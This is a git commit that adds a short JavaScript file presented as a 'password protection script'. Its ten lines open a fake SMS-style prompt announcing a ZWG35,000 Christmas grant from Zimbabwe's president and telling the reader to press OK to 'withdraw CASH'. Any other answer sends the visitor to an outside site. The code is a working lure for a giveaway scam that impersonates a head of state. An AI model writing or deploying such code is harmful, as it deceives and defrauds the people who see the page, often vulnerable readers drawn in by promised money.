2beff56cbe62ffbadff50bb156b0f7ff155bc762
mfednewblog9 <newekpeitid@gmail.com>
2025-12-24 07:33:18 +0100

    Create zimbabwe-active.js

---
+++ zimbabwe-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW ZWG35,000'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive the ZWG35,000 Christmas and new year Grant from President Emmerson Mnangagwa. Please press OK to withdraw CASH now.',
+  'WITHDRAW ZWG35,000'
+);
+if (password != 'WITHDRAW ZWG35,000') {
+  location.href = 'https://fhreekift.org/zimbabwe.html';
+}
